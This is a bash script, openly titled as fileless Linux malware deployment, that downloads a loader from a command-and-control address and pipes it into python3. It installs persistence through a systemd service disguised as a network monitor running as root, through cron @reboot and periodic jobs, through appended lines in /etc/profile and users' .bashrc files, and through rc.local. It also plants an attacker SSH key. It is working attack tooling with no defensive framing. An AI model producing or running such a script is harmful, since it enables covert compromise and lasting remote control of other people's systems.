#!/bin/bash
# Fileless Linux Malware Deployment - Survives Reboot

C2_SERVER="192.168.1.167:8000"

echo "[+] Deploying persistent fileless Linux malware..."

# 1. Download and execute loader in memory
echo "[+] Loading malware into memory..."
curl -s http://$C2_SERVER/loader.py | python3 -

# 2. Establish multiple persistence mechanisms
echo "[+] Establishing persistence..."

# Systemd service persistence
cat > /tmp/.systemd-setup.sh << 'EOF'
#!/bin/bash
# Create systemd service that survives reboot
cat > /etc/systemd/system/network-monitor.service << 'SERVICEEOF'
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 30; done"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
SERVICEEOF

systemctl daemon-reload
systemctl enable network-monitor.service
systemctl start network-monitor.service
EOF

chmod +x /tmp/.systemd-setup.sh
/bin/bash /tmp/.systemd-setup.sh
rm -f /tmp/.systemd-setup.sh

# 3. Cron persistence (survives reboot)
echo "[+] Setting up cron persistence..."
(crontab -l 2>/dev/null; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
(crontab -l 2>/dev/null; echo "*/3 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -

# 4. Profile persistence (survives login)
echo "[+] Setting up profile persistence..."
echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/profile
echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /root/.bashrc
echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /home/*/.bashrc 2>/dev/null

# 5. RC.local persistence (survives reboot)
echo "[+] Setting up rc.local persistence..."
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/i curl -s http://$C2_SERVER/loader.py | python3 - &' /etc/rc.local
else
    cat > /etc/rc.local << 'RCEOF'
#!/bin/bash
curl -s http://192.168.1.167:8000/loader.py | python3 - &
exit 0
RCEOF
    chmod +x /etc/rc.local
fi

# 6. SSH key persistence
echo "[+] Setting up SSH persistence..."
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

echo "[✅] Fileless malware deployed with FULL PERSISTENCE"
echo "[✅] Will survive reboot via: systemd, cron, profiles, rc.local"